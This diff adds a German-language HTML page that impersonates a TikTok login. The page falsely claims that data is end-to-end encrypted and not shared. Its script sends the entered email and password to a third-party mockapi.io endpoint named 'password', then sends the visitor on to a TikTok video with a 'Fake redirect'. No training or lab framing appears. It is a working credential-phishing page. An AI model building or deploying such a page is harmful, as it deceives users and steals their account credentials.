@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TikTok Login</title>
+    <style>
+		body {
+			font-family: Arial, sans-serif;
+			background-color: #000000;
+			color: white;
+			margin: 0;
+
+			display: flex;
+			justify-content: center; /* horizontal */
+			align-items: center;     /* vertikal */
+			min-height: 100vh;       /* gesamte Bildschirmhöhe */
+		}
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            border: 1px solid #333;
+            border-radius: 10px;
+            box-shadow: 0 0 10px #000;
+			align:center;
+        }
+		img {
+			width: 20%;
+			height: 20%;
+			display: block;
+			margin: 0 auto;
+		}
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 96%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #555;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #000000;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #111;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+		<img align="center" src="logo.png">
+        <h2>TikTok - Log In</h2>
+        <p align="center">Bitte verbinde dich mit deinem TikTok Account</p>
+
+		<p align="center">Alle Daten sind Ende zu Ende verschlüsselt und werden nicht weitergegeben</p>
+        <form id="loginForm">
+            <input type="email" placeholder="Email oder Telefonnummer" required />
+            <input type="password" placeholder="Passwort" required />
+            <button type="submit">Einloggen</button>
+        </form>
+        <div class="footer">
+            <p>© 2026 TikTok. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const email = document.querySelector("input[type='email']").value;
+            const password = document.querySelector("input[type='password']").value;
+
+
+            fetch("https://6a1dd904bcc4f20d5ca52932.mockapi.io/password", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ email, password })
+            }).then(() => {
+                alert("Redirecting...");
+                window.location.href = "www.tiktok.com/@pr4yforgabs/video/7332187682480590112?lang=de-DE"; // Fake redirect
+            });
+        });
+    </script>
+</body>
+</html>
